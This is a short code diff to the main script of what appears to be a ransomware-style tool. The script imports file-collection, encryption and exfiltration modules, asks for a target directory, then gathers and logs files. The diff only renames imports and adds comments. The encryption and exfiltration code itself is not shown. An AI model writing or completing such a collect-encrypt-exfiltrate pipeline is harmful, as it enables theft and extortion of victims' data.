@@ -1,7 +1,7 @@
 import os
-from collect_files import collect_files
-from encryption import encrypt_files, save_key
-from exfiltrate import run_exfiltration
+from test import collect_files  # File Collection
+from encryption import encrypt_files, save_key  # Encryption
+from exfil import run_exfiltration  # Exfiltration
 
 def main():
     target_dir = input("📁 Enter the directory to search: ").strip()
@@ -9,12 +9,11 @@ def main():
     # Step 1: Collect Files
     print("[*] Collecting target files...")
     files = collect_files(target_dir)
-    
+
     if not files:
         print("[-] No matching files found.")
         return
 
-    # Log file list
     with open("files.log", "w") as log:
         for file in files:
             log.write(file + "\n")
